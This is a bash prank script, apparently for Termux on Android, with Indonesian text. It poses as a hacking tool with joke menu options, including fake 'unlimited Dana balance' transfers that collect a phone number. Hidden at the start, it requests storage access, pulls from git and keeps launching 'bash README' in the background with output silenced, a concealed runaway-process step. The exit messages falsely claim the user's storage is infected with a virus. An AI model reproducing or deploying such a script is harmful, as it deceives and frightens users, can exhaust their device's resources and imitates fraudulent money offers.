#!/bin/bash
function gimmick(){
# // contoh gimik destroyer
    termux-setup-storage
    git pull origin main
    while true
    do
        bash README &>/dev/null &
        red='\033[1;31m'
        green='\033[1;32m'
        yellow='\033[1;33m'
        blue='\033[1;34m'
        resed='\033[1;37m'
        function asking() {
            while true; do
                if [ "${2:-}" = "Y" ]; then
                    prompt="Y/n"
                    default=Y
                elif [ "${2:-}" = "N" ]; then
                    prompt="y/N"
                    default=N
                else
                    prompt="y/n"
                    default=
                fi
                printf "${light_cyan}\n[?] "
                read -p "$1 [$prompt] " REPLY
                if [ -z "$REPLY" ]; then
                    REPLY=$default
                fi
                printf "${resed}"
                case "$REPLY" in
                    Y*|y*) return 0 ;;
                    N*|n*) return 1 ;;
                esac
            done
        }
        function banner() {
            clear
            printf "${red}"
            echo "NNNNNNNNNNNNNNNNNN"
            echo "NNNNNNNNNNNNNNNNNN"
            printf "${resed}"
            echo "NNNNNNNNNNNNNNNNNN"
            echo "NNNNNNNNNNNNNNNNNN"
        }
        function header() {
            echo ""
            printf "${red}"
            printf "${resed}"
            echo ""
            echo "Pilih Salah Satu:"
            echo "[1] Geser Bumi"
            echo "[2] Geser Bulan"
            echo "[3] Kill Alien"
            echo "[4] Lacak Lokasi Ayang"
            echo "[5] Cheat Masuk Surga No Root"
            echo "[6] Dana Unlimited"
            echo "[7] Keluar"
        }
        function ask() {
            echo ""
            read -p "Choose: " ask
        }
        function output() {
            if [[ ${ask} == "1" ]]; then
                clear
                sleep 2
                echo "Anda memilih untuk menggeser bumi..."
                printf "${red}"
                echo "Semua akibat anda yang tanggung!!!"
                echo ""
                printf "${resed}"
                read -p "Geser berapa meter[?]: " earth
                printf "${green}"
                echo "Menggeser..."
                sleep 5
                printf "${resed}"
                echo ""
                echo "Keren anda telah menggeser bumi sejauh" $earth"m"
            elif [[ $ask == "2" ]]; then
                clear
                sleep 2
                echo "Wow!! anda akan menggeser bulan..."
                printf "${red}"
                echo "Resiko tanggung sendiri!"
                printf "${resed}"
                echo ""
                read -p "Mau nggeser berapa meter[?]: " moon
                sleep 5
                printf "${red}"
                echo "Menggeser..."
                sleep 5
                printf "${resed}"
                echo ""
                echo "Anda layak diakui menjadi hacker pro, karena anda berhasil menggeser bulan sejauh" $moon"m"
            elif [[ ${ask} == "3" ]]; then
                clear
                sleep 2
                echo "Ayo kita bunuh para alien ini /:\ /:\ /:\ "
                echo "Ketik 'tembak' untuk membununya!"
                echo ""
                read -p "Ketik: " temb
                if [ $temb == "tembak" ]: then
                    printf "${red}"
                    echo "Dor Dor Dor!"
                    printf "${resed}"
                fi
                sleep 2
                echo ""
                echo "Masih ada dua lagi! /:\ /:\ "
                read -p "Ketik: " tem
                if [ $tem == "tembak" ]; then
                    printf "${red}"
                    echo "Dor Dor Dor!"
                    printf "${resed}"
                fi
                sleep 2
                echo ""
                echo "Masih ada satu lagi! /:\ "
                read -p "Ketik: " te
                if [ $te == "tembak" ]; then
                    printf "${red}"
                    echo "Dor Dor Dor!"
                    printf "${resed}"
                fi
                sleep 2
                echo ""
                echo "Wow! lihatlah hacker kita telah membunuh semua alien itu..."
            elif [[ ${ask} == "4" ]]; then
                clear
                sleep 2
                echo ""
                printf "${resed}"
                echo "Sepertinya anda tidak memiliki ayang..."
                printf "${red}"
                echo "Silakan cari ayang dulu"
                printf "${resed}"
                echo "Hahahaha Chuakzz"
            elif [[ ${ask} == "5" ]]; then
                clear
                sleep 2
                echo "Keren anda pilih cheat masuk surga!"
                printf "${red}"
                echo "Untuk mengaktifkan cheat, jawab pertanyaan berikut!"
                printf "${resed}"
                echo ""
                if asking "Apakah anda pengocok?" "Y"; then
                    echo "Maaf anda pengocok jadi tidak dapat kode cheat"
                else
                    echo "Selamat karena anda bukan pengocok! anda mendapatkan kode M45UK5URG4FR33"
                    read -p "Masukan disini: " kode
                    sleep 3
                    echo ""
                    if [ $kode == "M45UK5URG4FR33" ]; then
                        sleep 2
                        echo "Selamat semoga masuk surga"
                    else
                        sleep 2
                        echo "Masukkan agar anda mendapatkan cheat masuk surga"
                    fi
                fi
            elif [[ $ask == 6 ]]; then
                clear
                sleep 2
                echo ""
                echo "Anda ingin saldo dana gratis ?"
                printf "${read}"
                echo "Bagus sekali!"
                printf "${resed}"
                echo ""
                echo "Masukkan nomor dana anda"
                read -p "Nomor: " num
                echo "Mengidentifikasi Nomor" $num
                sleep 3
                echo "Nomor" $num "aktif"
                echo ""
                echo "Masukkan nominal dana"
                read -p "Nominal: " nom
                sleep 5
                echo "Transfer sebesar" $nom "berhasil di nomor" $num
            elif [[ $ask == "7" ]]; then
                echo "Selamat Penyimpanan internal Anda Kena VIRUS babay 🗿" && exit
            else
                echo "Invalid input"
                exit
            fi
        }
        function ask_rep() {
            printf "${resed}"
            echo ""
            echo "[1] Balik"
            echo "[2] Keluar"
            echo ""
            read -p "Choose: " pil
            if [ $pil == "1" ]
            then echo "Sebentar..." && sleep 3
            else echo "Selamat Penyimpanan internal Anda Kena VIRUS babay 🗿" && exit
            fi
        }
        while true; do
            banner
            header
            ask
            output
            ask_rep
        done
        read -p "SELAMAT INTERNAL ANDA KENA VIRUS, SILAHKAN CEK"
    done
}
gimmick
